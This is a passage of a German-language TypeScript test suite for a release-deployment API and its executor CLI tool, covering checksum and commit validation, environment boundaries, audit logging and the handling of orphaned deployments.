    // hat — sie müssen dem Release entsprechen (seit 2026-09-30).
    const fremderCommit = await ausfuehrer('POST', pfad, uebernahme({ commit: 'f'.repeat(40) }));
    assert.equal(fremderCommit.status, 422, fremderCommit.text);
    assert.match(fremderCommit.text, /Commit/);
    const andereVersion = await ausfuehrer('POST', pfad, uebernahme({ zielVersion: AUSF_ROT }));
    assert.equal(andereVersion.status, 422, andereVersion.text);
    assert.match(andereVersion.text, /Version/);
    const { commit: _commit, zielVersion: _ziel, ...ohneBeides } = uebernahme();
    assert.equal((await ausfuehrer('POST', pfad, ohneBeides)).status, 422, 'ohne Commit und Zielversion');
    assert.equal((await ausfuehrer('POST', pfad, uebernahme({ commit: COMMIT.slice(0, 12) }))).status, 422, 'Commit als Kürzel');
    assert.equal((await ausfuehrer('POST', pfad, uebernahme({ auftragId: rotAuftragId, zielVersion: AUSF_ROT }))).status, 422, 'CI nicht bestanden');
    assert.equal((await ausfuehrer('POST', pfad, uebernahme({ umgebung: 'production' }))).status, 422, 'fremde Umgebung');
    assert.equal((await db.releaseRequest.findUniqueOrThrow({ where: { id: auftragId } })).status, 'SCHEDULED');

    const erst = await ausfuehrer('POST', pfad, uebernahme());
    assert.equal(erst.status, 200, erst.text);
    assert.equal(erst.daten!.wiederholt, false);
    const nochmal = await ausfuehrer('POST', pfad, uebernahme());
    assert.equal(nochmal.status, 200, nochmal.text);
    assert.equal(nochmal.daten!.wiederholt, true);
    // Derselbe Schlüssel mit einem anderen Archiv ist keine Wiederholung.
    const anderesArtefakt = await ausfuehrer('POST', pfad, uebernahme({ artefaktSha256: 'e'.repeat(64) }));
    assert.equal(anderesArtefakt.status, 409, anderesArtefakt.text);
    const zweiter = await ausfuehrer('POST', pfad, uebernahme({ ausfuehrungsSchluessel: `lauf-${RUN}-zwei`, ausfuehrer: 'pruefreihe/zweiter' }));
    assert.equal(zweiter.status, 409, zweiter.text);

    const zeile = await db.releaseRequest.findUniqueOrThrow({ where: { id: auftragId } });
    assert.equal(zeile.status, 'DEPLOYING');
    assert.equal(zeile.verifiedSha256, SUMME);
    assert.equal(zeile.environment, 'test');
    assert.match(zeile.ciEvidence ?? '', /actions\/runs/);
  });

  it('während der Ausführung: das Dashboard entscheidet nicht mit und zeigt die Ausführung', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    const release = await db.release.findUniqueOrThrow({ where: { version: AUSF } });
    assert.equal(await zustandVon(release.id), 'DEPLOYING');
    assert.equal((await post(`/api/system/releases/${release.id}/freigabe`, undefined, { jar: jars.super })).status, 422);
    assert.equal((await put(`/api/system/releases/${release.id}/termin`, { scheduledFor: new Date(Date.now() + 86_400_000).toISOString() }, { jar: jars.super })).status, 422);
    const seite = (await get(`/admin/updates/${release.id}`, { jar: jars.super })).text.replace(/<!-- -->/g, '');
    for (const text of ['Wird installiert', 'In Ausführung', 'pruefreihe/test', 'CI-Lauf']) {
      assert.ok(seite.includes(text), `fehlt: ${text}`);
    }
  });

  it('Fortsetzen: derselbe Schlüssel findet seinen Auftrag wieder, ein fremder beginnt nichts, eine zweite Übernahme in der Umgebung → 409', async () => {
    const d = pflichtDb();
    const r = await ausfuehrer('GET', '/api/cron/release-auftraege?umgebung=test');
    assert.equal(r.status, 200, r.text);
    const inAusfuehrung = r.daten!.inAusfuehrung as { auftragId: string; ausfuehrungsSchluessel: string; ausfuehrer: string; seit: string | null }[];
    const eigener = inAusfuehrung.find((a) => a.auftragId === auftragId);
    assert.ok(eigener, 'der übernommene Auftrag fehlt in inAusfuehrung — ein abgebrochener Lauf fände ihn nicht wieder');
    assert.equal(eigener.ausfuehrungsSchluessel, SCHLUESSEL_EINS);
    assert.equal(eigener.ausfuehrer, 'pruefreihe/test');
    assert.ok(eigener.seit && !Number.isNaN(Date.parse(eigener.seit)));
    // Der Plan des Werkzeugs auf genau dieser Antwort.
    const lage = r.daten as unknown as Lage;
    const fortsetzen = planen(lage, SCHLUESSEL_EINS);
    assert.equal(fortsetzen.modus, 'fortsetzen');
    assert.equal(fortsetzen.auftrag?.auftragId, auftragId);
    assert.equal(planen(lage, `lauf-${RUN}-fremd`).modus, 'nichts');

    // Eine zweite, ausführbare Version, von einem anderen Lauf übernommen:
    // 409, solange die erste läuft — zwei Umschaltungen gleichzeitig hätten
    // keinen definierten Rücksprung.
    const zweite = await versionMitAuftrag({ version: AUSF_ZWEI, commit: COMMIT_ZWEI, status: 'SCHEDULED' });
    try {
      const antwort = await ausfuehrer(
        'POST',
        UEBERNEHMEN,
        uebernahme({ auftragId: zweite.auftrag.id, ausfuehrungsSchluessel: `lauf-${RUN}-zweite`, ausfuehrer: 'pruefreihe/zweiter', commit: COMMIT_ZWEI, zielVersion: AUSF_ZWEI }),
      );
      assert.equal(antwort.status, 409, antwort.text);
      assert.match(antwort.text, /gerade Version/);
      assert.equal((await d.releaseRequest.findUniqueOrThrow({ where: { id: zweite.auftrag.id } })).status, 'SCHEDULED');
    } finally {
      // Nicht liegen lassen: Ein fälliger Auftrag ohne Hindernis würde sonst
      // vom Werkzeug weiter unten statt des eigenen geplant.
      await entfernen(zweite);
    }
  });

  it('Ergebnis: fremder Schlüssel 409, „erfolgreich" ohne Zielversion 422, fehlgeschlagen 200, Wiederholung 200, Widerspruch 409 — „ohne Zielversion" heisst seit 2026-09-30: die Instanz belegt sie nicht; die alte Form mit laufendeVersion ebenfalls 422', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    const meldung = (ueber: Record<string, unknown>) => ({ auftragId, ausfuehrungsSchluessel: SCHLUESSEL_EINS, ...ueber });
    assert.equal((await ausfuehrer('POST', ERGEBNIS, meldung({ ausfuehrungsSchluessel: `lauf-${RUN}-zwei`, ergebnis: 'FAILED', aktivierung: 'UNKLAR' }))).status, 409);
    // Der Testserver belegt PRUEF_IDENTITAET_COMMIT, das Release trägt COMMIT:
    // Die antwortende Instanz ist nicht das Ziel, also kein Erfolg — egal,
    // was der Ausführer behauptet.
    const fremd = await ausfuehrer('POST', ERGEBNIS, meldung({ ergebnis: 'SUCCEEDED', aktivierung: 'AKTIV' }));
    assert.equal(fremd.status, 422, fremd.text);
    assert.match(fremd.text, /Commit/);
    // Die Form bis 2026-09-30: eine vom Ausführer gemeldete Version. Sie gibt es nicht mehr.
    assert.equal((await ausfuehrer('POST', ERGEBNIS, meldung({ ergebnis: 'SUCCEEDED', aktivierung: 'AKTIV', laufendeVersion: AUSF }))).status, 422);
    // Erfolg nach „zurück" ist ein Widerspruch im Ausführer; ohne Aktivierung fehlt der Nachweis fürs Protokoll.
    assert.equal((await ausfuehrer('POST', ERGEBNIS, meldung({ ergebnis: 'SUCCEEDED', aktivierung: 'ZURUECK' }))).status, 422);
    assert.equal((await ausfuehrer('POST', ERGEBNIS, meldung({ ergebnis: 'FAILED' }))).status, 422, 'ohne aktivierung');
    assert.equal((await db.releaseRequest.findUniqueOrThrow({ where: { id: auftragId } })).status, 'DEPLOYING');

    const fehl = await ausfuehrer('POST', ERGEBNIS, meldung({ ergebnis: 'FAILED', aktivierung: 'NICHT_UMGESCHALTET', meldung: 'Vorprüfung gescheitert, nichts umgeschaltet.' }));
    assert.equal(fehl.status, 200, fehl.text);
    assert.equal((await ausfuehrer('POST', ERGEBNIS, meldung({ ergebnis: 'FAILED', aktivierung: 'NICHT_UMGESCHALTET' }))).daten?.wiederholt, true);
    assert.equal((await ausfuehrer('POST', ERGEBNIS, meldung({ ergebnis: 'SUCCEEDED', aktivierung: 'AKTIV' }))).status, 409);
    const zeile = await db.releaseRequest.findUniqueOrThrow({ where: { id: auftragId } });
    assert.equal(zeile.status, 'FAILED');
    assert.ok(zeile.finishedAt);
  });

  it('Prüfprotokoll: Übernahme und Ergebnis, ohne Benutzer, mit Ausführer und Nachweis — Nachweis heisst Prüfsumme, Aktivierung und was der Server beobachtet hat', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    const eintraege = await db.auditLog.findMany({ where: { entity: 'ReleaseRequest', entityId: auftragId }, orderBy: { createdAt: 'asc' } });
    assert.deepEqual(
      eintraege.map((e) => (e.changes as { status?: { to: string } }).status?.to),
      ['DEPLOYING', 'FAILED'],
    );
    for (const e of eintraege) {
      assert.equal(e.userId, null);
      assert.equal((e.changes as { ausfuehrer?: string }).ausfuehrer, 'pruefreihe/test');
      // Beobachtet heisst: aus der Identität der Instanz, nicht aus der Meldung.
      const beobachtet = (e.changes as { beobachtet?: { commit: string; buildId: string | null; identitaet: string } }).beobachtet;
      assert.equal(beobachtet?.commit, PRUEF_IDENTITAET_COMMIT);
      assert.equal(beobachtet?.identitaet, 'belegt');
      assert.ok(typeof beobachtet?.buildId === 'string');
    }
    assert.equal((eintraege[0]!.changes as { artefaktSha256?: string }).artefaktSha256, SUMME);
    assert.equal((eintraege[1]!.changes as { aktivierung?: string }).aktivierung, 'NICHT_UMGESCHALTET');
    const alles = JSON.stringify(eintraege);
    assert.ok(!alles.includes(PRUEF_AUSFUEHRER_TOKEN) && !alles.includes(PRUEF_AUSFUEHRER_SCHLUESSEL), 'Geheimnis im Protokoll');
  });

  it('„erfolgreich" belegt die Instanz selbst: eigener Commit und eigene Version → 200; ein Rücksprung, während das Ziel läuft → 422; ein Auftrag einer anderen Umgebung → 422', async () => {
    const d = pflichtDb();
    // Ein Release mit genau dem Stand, den der Testserver belegt. Eine echte
    // Version dieser Nummer darf es in der Testdatenbank nicht geben (die
    // Nummer ist eindeutig); Reste abgebrochener Läufe räumt `aufraeumen` weg.
    assert.equal(
      await d.release.count({ where: { version: PAKET_VERSION, NOT: { summary: { startsWith: 'Prüfversion' } } } }),
      0,
      `Version ${PAKET_VERSION} steht bereits ausserhalb der Prüfreihe in der Testdatenbank`,
    );
    const schluessel = `lauf-${RUN}-identitaet`;
    const eigen = await versionMitAuftrag({ version: PAKET_VERSION, commit: PRUEF_IDENTITAET_COMMIT, status: 'DEPLOYING', fromVersion: PAKET_VERSION, schluessel });
    try {
      const m = (ueber: Record<string, unknown>) => ({ auftragId: eigen.auftrag.id, ausfuehrungsSchluessel: schluessel, ...ueber });
      // Die Version gleicht der Ausgangsversion — aber der Commit ist das
      // Ziel. Das ist kein Rücksprung.
      const rueck = await ausfuehrer('POST', ERGEBNIS, m({ ergebnis: 'ROLLED_BACK', aktivierung: 'ZURUECK' }));
      assert.equal(rueck.status, 422, rueck.text);
      assert.match(rueck.text, /kein Rücksprung/);

      // Dieselbe Identität, aber der Auftrag gilt einer anderen Umgebung: Eine
      // Instanz der Umgebung test belegt nicht, was in staging läuft — auch
      // wenn sie zufällig denselben Commit trägt. Ohne diese Grenze meldete
      // eine Vorschau mit demselben Stand die Produktion als erfolgreich.
      await d.releaseRequest.update({ where: { id: eigen.auftrag.id }, data: { environment: 'staging' } });
      const fremdeUmgebung = await ausfuehrer('POST', ERGEBNIS, m({ ergebnis: 'SUCCEEDED', aktivierung: 'AKTIV' }));
      assert.equal(fremdeUmgebung.status, 422, fremdeUmgebung.text);
      // Aus dem geparsten Fehler: Im JSON-Text stünde das schliessende `"` als `\"`.
      assert.match((JSON.parse(fremdeUmgebung.text) as { error: { message: string } }).error.message, /„staging", diese Instanz ist „test"/);
      assert.equal((await d.releaseRequest.findUniqueOrThrow({ where: { id: eigen.auftrag.id } })).status, 'DEPLOYING');
      await d.releaseRequest.update({ where: { id: eigen.auftrag.id }, data: { environment: 'test' } });

      const erfolg = await ausfuehrer('POST', ERGEBNIS, m({ ergebnis: 'SUCCEEDED', aktivierung: 'AKTIV', meldung: 'Aktivierung Code 0 (AKTIV)' }));
      assert.equal(erfolg.status, 200, erfolg.text);
      assert.equal((await d.releaseRequest.findUniqueOrThrow({ where: { id: eigen.auftrag.id } })).status, 'SUCCEEDED');
      const eintrag = await letzterEintrag(eigen.auftrag.id);
      const changes = eintrag?.changes as { status: { to: string }; aktivierung: string; beobachtet: { commit: string; buildId: string | null; version: string } };
      assert.equal(changes.status.to, 'SUCCEEDED');
      assert.equal(changes.aktivierung, 'AKTIV');
      assert.equal(changes.beobachtet.commit, PRUEF_IDENTITAET_COMMIT);
      assert.equal(changes.beobachtet.version, PAKET_VERSION);
      assert.ok(typeof changes.beobachtet.buildId === 'string');
    } finally {
      await entfernen(eigen);
    }
  });

  it('„zurückgesetzt" nur, wenn die Instanz die Ausgangsversion mit einem anderen Commit belegt', async () => {
    const d = pflichtDb();
    const schluessel = `lauf-${RUN}-rueck`;
    const rueck = await versionMitAuftrag({ version: AUSF_RUECK, commit: COMMIT_RUECK, status: 'DEPLOYING', fromVersion: '0.9.0', schluessel });
    try {
      const m = { auftragId: rueck.auftrag.id, ausfuehrungsSchluessel: schluessel, ergebnis: 'ROLLED_BACK', aktivierung: 'ZURUECK' };
      // Der Auftrag begann bei 0.9.0; die Instanz belegt eine andere Version.
      const falsch = await ausfuehrer('POST', ERGEBNIS, m);
      assert.equal(falsch.status, 422, falsch.text);
      assert.match(falsch.text, /Ausgangsversion 0\.9\.0/);
      assert.equal((await d.releaseRequest.findUniqueOrThrow({ where: { id: rueck.auftrag.id } })).status, 'DEPLOYING');

      await d.releaseRequest.update({ where: { id: rueck.auftrag.id }, data: { fromVersion: PAKET_VERSION } });
      const richtig = await ausfuehrer('POST', ERGEBNIS, m);
      assert.equal(richtig.status, 200, richtig.text);
      const zeile = await d.releaseRequest.findUniqueOrThrow({ where: { id: rueck.auftrag.id } });
      assert.equal(zeile.status, 'ROLLED_BACK');
      assert.equal(zeile.rollbackVersion, PAKET_VERSION);
    } finally {
      await entfernen(rueck);
    }
  });

  it('verwaiste Ausführung: der stündliche Lauf schliesst sie nach zwei Stunden anhand der Identität — belegt erfolgreich, sonst fehlgeschlagen; eine andere Umgebung bleibt unberührt', async () => {
    const d = pflichtDb();
    const vorDreiStunden = new Date(Date.now() - 3 * 60 * 60_000);
    const belegt = await versionMitAuftrag({ version: PAKET_VERSION, commit: PRUEF_IDENTITAET_COMMIT, status: 'DEPLOYING', schluessel: `lauf-${RUN}-verwaist-a`, claimedAt: vorDreiStunden });
    const fremd = await versionMitAuftrag({ version: AUSF_VERWAIST, commit: COMMIT_VERWAIST, status: 'DEPLOYING', schluessel: `lauf-${RUN}-verwaist-b`, claimedAt: vorDreiStunden });
    const jung = await versionMitAuftrag({ version: AUSF_JUNG, commit: COMMIT_JUNG, status: 'DEPLOYING', schluessel: `lauf-${RUN}-jung`, claimedAt: new Date(Date.now() - 30 * 60_000) });
    // Ebenso alt, aber in staging übernommen: Die Identität dieser Instanz
    // (Umgebung test) sagt nichts darüber, was in staging läuft. Schlösse der
    // Lauf ihn trotzdem, meldete eine Vorschau das Scheitern der Produktion.
    const andereUmgebung = await versionMitAuftrag({
      version: AUSF_STAGING,
      commit: COMMIT_STAGING,
      status: 'DEPLOYING',
      schluessel: `lauf-${RUN}-staging`,
      claimedAt: vorDreiStunden,
      umgebung: 'staging',
    });
    const stuendlich = () =>
      get<{ failures: string[]; summary: Record<string, unknown> }>('/api/cron/hourly', {
        headers: { authorization: `Bearer ${process.env.CRON_SECRET ?? 'dev-cron-secret'}` },
      });
    const zeile = (id: string) => d.releaseRequest.findUniqueOrThrow({ where: { id } });
    try {
      const lauf = await stuendlich();
      assert.ok([200, 500].includes(lauf.status), `HTTP ${lauf.status}: ${lauf.text.slice(0, 300)}`);
      assert.ok(!lauf.payload.failures.includes('releaseAusfuehrungen'), JSON.stringify(lauf.payload.summary?.releaseAusfuehrungen));

      const a = await zeile(belegt.auftrag.id);
      assert.equal(a.status, 'SUCCEEDED', 'die Instanz belegt genau dieses Ziel');
      assert.match(a.resultMessage ?? '', /durch die Identität der Instanz belegt/i);
      assert.ok(a.finishedAt);
      const b = await zeile(fremd.auftrag.id);
      assert.equal(b.status, 'FAILED');
      assert.match(b.resultMessage ?? '', /ohne Rückmeldung abgelaufen/i);
      assert.equal(b.rollbackVersion, null, 'ein Ablauf ist kein belegter Rücksprung');
      assert.equal((await zeile(jung.auftrag.id)).status, 'DEPLOYING', 'eine halbe Stunde ist keine verwaiste Ausführung');
      const staging = await zeile(andereUmgebung.auftrag.id);
      assert.equal(staging.status, 'DEPLOYING', 'der stündliche Lauf hat einen Auftrag einer anderen Umgebung abgeschlossen');
      assert.equal(staging.finishedAt, null);
      assert.equal(await letzterEintrag(staging.id), null, 'für den Auftrag einer anderen Umgebung steht ein Protokolleintrag');

      for (const id of [a.id, b.id]) {
        const e = await letzterEintrag(id);
        assert.equal(e?.userId, null);
        assert.equal((e?.changes as { abgeschlossenDurch?: string }).abgeschlossenDurch, 'stuendlicher-lauf');
      }

      // Ein zweiter Lauf ändert nichts mehr.
      const zweiter = await stuendlich();
      assert.ok([200, 500].includes(zweiter.status));
      const aNachher = await zeile(a.id);
      assert.equal(aNachher.status, 'SUCCEEDED');
      assert.equal(aNachher.finishedAt?.toISOString(), a.finishedAt?.toISOString());
    } finally {
      // Der junge DEPLOYING sperrte sonst die Umgebung für das Werkzeug unten.
      await entfernen(belegt, fremd, jung, andereUmgebung);
    }
  });

  it('das Werkzeug scripts/release-ausfuehrer.ts: plan, ci-lauf, abholen, fortsetzen, melden — mit derselben Signatur', async () => {
    const d = pflichtDb();
    // Ein eigenes Artefakt: Bytes, Prüfsummendatei, Beilage (Format 2) — wie
    // `scripts/release-artefakt.ts` sie ablegt.
    const verzeichnis = artefaktVerzeichnis('clenaris-ausfuehrer-');
    const commit = createHash('sha1').update(`werkzeug-${RUN}`).digest('hex');
    const name = `clenaris-${commit.slice(0, 12)}`;
    const archiv = join(verzeichnis, `${name}.tar.gz`);
    const bytes = Buffer.from(`Prüfartefakt ${RUN}`);
    const summe = createHash('sha256').update(bytes).digest('hex');
    const LAUF = String(RUN);
    const CI_URL = `https://github.com/beispiel/clenaris/actions/runs/${LAUF}`;
    const artefaktSchreiben = (inhalt: Buffer) => {
      writeFileSync(archiv, inhalt);
      writeFileSync(`${archiv}.sha256`, `${summe}  ${name}.tar.gz\n`);
      writeFileSync(
        join(verzeichnis, `${name}.json`),
        JSON.stringify(pruefBeilage(bytes, { commit, version: AUSF_WERKZEUG, ci: { lauf: LAUF, versuch: '1', ereignis: 'push', ref: 'refs/heads/main', repository: 'beispiel/clenaris' } })),
      );
    };
    const laeufe = join(verzeichnis, 'laeufe.json');
    // Der grüne Lauf des Pull Requests hat die höhere Nummer — gewählt werden
    // darf trotzdem nur der Push-Lauf auf main.
    writeFileSync(
      laeufe,
      JSON.stringify([
        { databaseId: RUN + 1, url: `https://github.com/beispiel/clenaris/actions/runs/${RUN + 1}`, headSha: commit, headBranch: 'feature/x', event: 'pull_request', status: 'completed', conclusion: 'success' },
        { databaseId: RUN, url: CI_URL, headSha: commit, headBranch: 'main', event: 'push', status: 'completed', conclusion: 'success' },
      ]),
    );

    const release = await d.release.create({
      data: { version: AUSF_WERKZEUG, releasedAt: new Date(), kind: 'PATCH', summary: 'Prüfversion für das Werkzeug.', ciStatus: 'PASSED', commit, artifactSha256: summe, artifactSizeBytes: bytes.length },
    });
    const neuerAuftrag = () =>
      d.releaseRequest.create({
        data: { organizationId: org, releaseId: release.id, status: 'SCHEDULED', fromVersion: PAKET_VERSION, toVersion: AUSF_WERKZEUG, scheduledFor: new Date(Date.now() - 60_000), approvedById: superId, approvedAt: new Date() },
      });
    const auftrag = await neuerAuftrag();

    const ausgabeDatei = join(verzeichnis, 'github-output.txt');
    const ausgabenLesen = (): Record<string, string> =>
      existsSync(ausgabeDatei)
        ? Object.fromEntries(
            readFileSync(ausgabeDatei, 'utf8')
              .split('\n')
              .filter(Boolean)
              .map((z) => [z.slice(0, z.indexOf('=')), z.slice(z.indexOf('=') + 1)]),
          )
        : {};
    const werkzeug = (schluessel: string, ...args: string[]) => {
      rmSync(ausgabeDatei, { force: true });
      const lauf = spawnSync(process.execPath, [join('node_modules', 'tsx', 'dist', 'cli.mjs'), 'scripts/release-ausfuehrer.ts', ...args], {
        env: {
          ...process.env,
          CLENARIS_URL: BASE_URL,
          RELEASE_EXECUTOR_TOKEN: PRUEF_AUSFUEHRER_TOKEN,
          RELEASE_EXECUTOR_SIGNING_KEY: PRUEF_AUSFUEHRER_SCHLUESSEL,
          UMGEBUNG: 'test',
          AUSFUEHRER: 'pruefreihe/werkzeug',
          SCHLUESSEL: schluessel,
          GITHUB_OUTPUT: ausgabeDatei,
          AUSFUEHRER_WIEDERHOLUNGEN: '0',
        },
        encoding: 'utf8',
      });
      return { status: lauf.status, stdout: lauf.stdout, text: `${lauf.stdout}\n${lauf.stderr}`, ausgaben: ausgabenLesen() };
    };
    const EINS = `werkzeug-${RUN}-lauf`;
    const ZWEI = `werkzeug-${RUN}-zwei`;
    const abholen = (schluessel: string, id: string) =>
      werkzeug(schluessel, 'abholen', '--verzeichnis', verzeichnis, '--auftrag', id, '--ci-lauf', LAUF, '--ci-url', CI_URL);

    try {
      artefaktSchreiben(bytes);

      // plan: Der rote Auftrag liegt noch fällig da und wird mit Grund übersprungen.
      const plan = werkzeug(EINS, 'plan');
      assert.equal(plan.status, 0, plan.text);
      assert.match(plan.stdout, /Übersprungen .*Prüfstufe/);
      assert.deepEqual(plan.ausgaben, { modus: 'neu', auftrag: auftrag.id, commit, zielversion: AUSF_WERKZEUG });

      const ci = werkzeug(EINS, 'ci-lauf', '--datei', laeufe, '--commit', commit);
      assert.equal(ci.status, 0, ci.text);
      assert.deepEqual(ci.ausgaben, { id: LAUF, url: CI_URL });

      const erst = abholen(EINS, auftrag.id);
      assert.equal(erst.status, 0, erst.text);
      assert.deepEqual(erst.ausgaben, { archiv, sha256: summe, buildid: PRUEF_BUILD_ID });
      assert.equal((await d.releaseRequest.findUniqueOrThrow({ where: { id: auftrag.id } })).status, 'DEPLOYING');

      // Derselbe Lauf nach einem Abbruch: plan sagt „fortsetzen", abholen
      // bestätigt dieselbe Übernahme; ein fremder Lauf beginnt nichts.
      const wieder = werkzeug(EINS, 'plan');
      assert.deepEqual(wieder.ausgaben, { modus: 'fortsetzen', auftrag: auftrag.id, commit, zielversion: AUSF_WERKZEUG });
      const nochmal = abholen(EINS, auftrag.id);
      assert.equal(nochmal.status, 0, nochmal.text);
      assert.match(nochmal.stdout, /bereits mit diesem Schlüssel übernommen/);
      assert.equal(werkzeug(ZWEI, 'plan').ausgaben.modus, 'nichts');

      // Aktivierung 20: umgeschaltet, ungesund, zurück. Die Instanz belegt die
      // Ausgangsversion mit einem anderen Commit — also ein belegter Rücksprung.
      // Festgehalten, aber kein Erfolg: Ausgang 2, der Lauf endet rot (seit
      // 2026-10-01; bis dahin 0, und die Vorlage las `ergebnis` nie).
      const rueck = werkzeug(EINS, 'melden', '--auftrag', auftrag.id, '--aktivierung', '20');
      assert.equal(rueck.status, AUSGANG_KEIN_ERFOLG, rueck.text);
      assert.deepEqual(rueck.ausgaben, { ergebnis: 'ROLLED_BACK' });
      const zeile = await d.releaseRequest.findUniqueOrThrow({ where: { id: auftrag.id } });
      assert.equal(zeile.status, 'ROLLED_BACK');
      assert.equal(zeile.rollbackVersion, PAKET_VERSION);
      assert.equal(((await letzterEintrag(auftrag.id))?.changes as { aktivierung?: string }).aktivierung, 'ZURUECK');

      // Ein Artefakt, dessen Bytes nicht zur Summe passen, wird nicht übernommen,
      // und nach der Ablehnung steht nichts in GITHUB_OUTPUT.
      const zweiter = await neuerAuftrag();
      artefaktSchreiben(Buffer.from('andere Bytes'));
      const falsch = abholen(ZWEI, zweiter.id);
      assert.notEqual(falsch.status, 0, 'eine falsche Summe wurde übernommen');
      assert.deepEqual(falsch.ausgaben, {});
      assert.equal((await d.releaseRequest.findUniqueOrThrow({ where: { id: zweiter.id } })).status, 'SCHEDULED');

      // Aktivierung 0 mit fremder Identität: Der Testserver belegt
      // PRUEF_IDENTITAET_COMMIT, nicht dieses Release. Ohne Wiederholungen
      // meldet das Werkzeug FAILED mit dem Grund des Servers — und endet rot:
      // Die Aktivierung war grün, nur dieser Ausgang hält den Lauf davon ab,
      // ein festgehaltenes Scheitern grün zu beenden (Gegenprüfung 2026-09-30).
      artefaktSchreiben(bytes);
      const richtig = abholen(ZWEI, zweiter.id);
      assert.equal(richtig.status, 0, richtig.text);
      const erfolg = werkzeug(ZWEI, 'melden', '--auftrag', zweiter.id, '--aktivierung', '0');
      assert.equal(erfolg.status, AUSGANG_KEIN_ERFOLG, erfolg.text);
      assert.match(erfolg.text, /Festgehalten ist FAILED statt SUCCEEDED/);
      assert.deepEqual(erfolg.ausgaben, { ergebnis: 'FAILED' });
      assert.match(erfolg.stdout, /abgewiesen/);
      const zweiteZeile = await d.releaseRequest.findUniqueOrThrow({ where: { id: zweiter.id } });
      assert.equal(zweiteZeile.status, 'FAILED');
      assert.match(zweiteZeile.resultMessage ?? '', /SUCCEEDED abgewiesen: .*Commit/);
      assert.equal(((await letzterEintrag(zweiter.id))?.changes as { aktivierung?: string }).aktivierung, 'AKTIV');
    } finally {
      rmSync(verzeichnis, { recursive: true, force: true });
    }
  });
});

// ===========================================================================
//  Werkzeug und Verträge ohne Server (2026-09-30)
// ===========================================================================

/**
 * Was sich ohne laufende Anwendung prüfen lässt — die Regeln des Werkzeugs
 * und die Schemas der Schnittstelle. Einzeln lauffähig:
 *
 *   npx tsx --test --test-name-pattern="ohne Server" tests/api/release-center.test.ts
 */
describe('Release-Ausführer: Werkzeug und Verträge ohne Server (rein)', () => {
  const C = createHash('sha1').update('ci-lauf-rein').digest('hex');
  const lauf = (id: number, ueber: Record<string, unknown> = {}) => ({
    databaseId: id,
    url: `https://github.com/beispiel/clenaris/actions/runs/${id}`,
    headSha: C,
    headBranch: 'main',
    event: 'push',
    status: 'completed',
    conclusion: 'success',
    ...ueber,
  });

  /**
   * Eine Attrappe der Schnittstelle auf 127.0.0.1 — für die Fälle, in denen
   * das Werkzeug als Prozess gegen „die Anwendung" läuft, ohne
   * Anwendungsserver. `antworten` bekommt Methode, Pfad samt Abfrage und den
   * geparsten Rumpf und gibt Status und `data` (oder eine Fehlermeldung in
   * der Form von `toErrorResponse`) zurück; `null` heisst 404. Die Signatur
   * prüft die Attrappe nicht — das tun die Fälle gegen den Server oben.
   */
  async function attrappeStarten(
    antworten: (methode: string, pfad: string, rumpf: Record<string, unknown> | null) => { status: number; daten?: unknown; fehler?: string } | null,
  ): Promise<{ basis: string; schliessen: () => Promise<void> }> {
    const server = createServer((anfrage, antwort) => {
      let roh = '';
      anfrage.on('data', (d: Buffer) => (roh += d.toString()));
      anfrage.on('end', () => {
        let rumpf: Record<string, unknown> | null = null;
        try {
          rumpf = roh ? (JSON.parse(roh) as Record<string, unknown>) : null;
        } catch {
          /* kein JSON — die Attrappe antwortet trotzdem */
        }
        const a = antworten(anfrage.method ?? '', anfrage.url ?? '', rumpf);
        antwort.setHeader('content-type', 'application/json');
        antwort.statusCode = a?.status ?? 404;
        antwort.end(JSON.stringify(a?.fehler ? { error: { message: a.fehler } } : { data: a?.daten ?? null }));
      });
    });
    await new Promise<void>((ok) => server.listen(0, '127.0.0.1', ok));
    return {
      basis: `http://127.0.0.1:${(server.address() as AddressInfo).port}`,
      schliessen: () => new Promise<void>((ok) => server.close(() => ok())),
    };
  }

  /**
   * Das Werkzeug als eigener Prozess — asynchron gestartet, nicht mit
   * `spawnSync`: Die Attrappe läuft in diesem Prozess und könnte sonst nicht
   * antworten. `GITHUB_OUTPUT` zeigt auf eine frische Datei; zurück kommen
   * Ausgang, Text (stdout und stderr) und der Inhalt der Datei.
   */
  function werkzeugAsynchron(
    args: readonly string[],
    env: Record<string, string>,
    ausgabeDatei: string,
  ): Promise<{ status: number | null; text: string; ausgabe: string }> {
    rmSync(ausgabeDatei, { force: true });
    return new Promise((ok) => {
      const lauf = spawn(process.execPath, [join('node_modules', 'tsx', 'dist', 'cli.mjs'), 'scripts/release-ausfuehrer.ts', ...args], {
        env: { ...process.env, ...env, GITHUB_OUTPUT: ausgabeDatei },
        stdio: ['ignore', 'pipe', 'pipe'],
      });
      let text = '';
      lauf.stdout.on('data', (d: Buffer) => (text += d.toString()));
      lauf.stderr.on('data', (d: Buffer) => (text += d.toString()));
      lauf.on('close', (status) => ok({ status, text, ausgabe: existsSync(ausgabeDatei) ? readFileSync(ausgabeDatei, 'utf8') : '' }));
    });
  }

  it('ci-lauf nimmt nur einen abgeschlossenen, grünen Push-Lauf auf main für genau diesen Commit', () => {
    assert.deepEqual(ciLaufWaehlen([lauf(10), lauf(12), lauf(11)], C), { id: '12', url: 'https://github.com/beispiel/clenaris/actions/runs/12' });
    const falsche = [
      lauf(20, { event: 'pull_request' }),
      lauf(21, { headBranch: 'feature/x' }),
      lauf(22, { conclusion: 'failure' }),
      lauf(23, { status: 'in_progress', conclusion: '' }),
      lauf(24, { headSha: 'd'.repeat(40) }),
      lauf(25, { url: 'https://github.com/beispiel/clenaris/actions/runs/99' }),
      lauf(26, { event: 'workflow_run' }),
    ];
    assert.throws(
      () => ciLaufWaehlen(falsche, C),
      (e: unknown) =>
        e instanceof AusfuehrerFehler &&
        /pull_request/.test(e.message) &&
        /feature\/x/.test(e.message) &&
        /failure/.test(e.message) &&
        /in_progress/.test(e.message) &&
        /Adresse passt nicht/.test(e.message) &&
        /workflow_run/.test(e.message),
    );
    // Zwischen den falschen genau ein richtiger: nur der gilt, auch mit kleinerer Nummer.
    assert.equal(ciLaufWaehlen([...falsche, lauf(19)], C).id, '19');
    assert.throws(() => ciLaufWaehlen({ laeufe: [] }, C), AusfuehrerFehler);
    assert.throws(() => ciLaufWaehlen([lauf(1)], C.slice(0, 12)), /40 Hexadezimalzeichen/);
    assert.throws(() => ciLaufWaehlen([], C), /kein Lauf für diesen Commit/);
  });

  it('GITHUB_OUTPUT: jeder Wert wird je Schlüssel geprüft, Zeilenumbrüche werden abgewiesen', () => {
    assert.equal(ausgabeZeile('modus', 'neu'), 'modus=neu');
